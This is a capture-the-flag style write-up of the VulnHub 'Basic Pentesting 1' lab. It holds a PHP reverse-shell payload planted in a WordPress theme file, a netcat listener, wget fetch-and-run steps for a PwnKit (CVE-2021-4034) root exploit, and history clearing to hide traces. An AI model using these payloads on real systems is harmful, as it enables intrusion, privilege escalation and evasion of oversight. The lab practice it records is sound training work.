# Target: VulnHub – Basic Pentesting 1

## Engagement Overview
**Target:** Basic Pentesting 1 (VulnHub)  
**Box IP:** 192.168.56.102  

---

### Objectives
- Regain WordPress admin access
- Inject PHP reverse shell via theme
- Get reverse shell to Kali
- Upgrade to interactive TTY
- Enumerate for privilege escalation vectors
- Exploit PwnKit (CVE-2021-4034) to gain root
- Clean up artifacts

---

## Service Enumeration

**Ports Open:**  
- 22/tcp – OpenSSH 7.2p2  
- 80/tcp – Apache httpd 2.4.18  
- 139/tcp, 445/tcp – Samba smbd 3.X - 4.X  

**Host Details:**  
- OS: Ubuntu 16.04.3 LTS  
- Kernel: 4.10.0-28-generic  

**Web Findings:**  
- `/robots.txt` exposed  
- WordPress login interface at `/wp-login.php`  
- Default `twentyseventeen` theme installed

**Local User Identified:** `marlinspike`

---

## Methodologies

- WordPress authentication brute-force bypass  
- PHP reverse shell injection into `404.php`  
- Triggered web payload to connect back to listener  
- Upgraded shell to interactive TTY with Python  
- Privilege escalation via static PwnKit binary  

---

## Initial Access

**Weak Point:** WordPress login  
**Method:** Direct login with known creds  

**Payload Used:**  
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"); ?>
```

**Delivery:** Uploaded via WordPress theme editor (404.php)  
**Trigger:**  
```bash
curl "http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php"
```

**Listener Setup on Kali:**  
```bash
nc -lvnp 4444
```

**Result:** Shell gained as `www-data`

---

## Privilege Escalation

**Exploit Used:** CVE-2021-4034 (PwnKit)  
**Vector:** SUID binary `/usr/bin/pkexec`  

**Approach:**  
- Static binary hosted via Python web server  
- Remote download and execution

**Steps:**  
_On Kali:_  
```bash
python3 -m http.server 8000
```

_On Target:_  
```bash
cd /tmp
wget http://192.168.56.10:8000/PwnKit -O PwnKit
chmod +x PwnKit
./PwnKit
```

**Result:**  
```bash
root@vtcsec:/tmp# whoami
root
```

---

## House Cleaning

- `rm /tmp/PwnKit`  
- `history -c`  
- No persistence or root flag pulled (purpose: shell lifecycle practice)

---

## Post-Exploitation

**Tools Utilized**
* nmap, gobuster, wpscan  
* curl, netcat, wget, python3  
* Metasploit (ProFTPD tested)  
* Static precompiled PwnKit binary

---

## Key Takeaways

* Always check for exposed WordPress login surfaces (`/wp-login.php`, XML-RPC)  
* Curl-triggered PHP payloads are reliable for post-auth web shells  
* Static exploit binaries prevent headaches from GLIBC or compiler issues  
* Interactive shell upgrades require `stty raw -echo` and TTY awareness  
* Post-access enumeration is more efficient than brute forcing — privilege escalation often hides in default configs

---

### Status: COMPLETED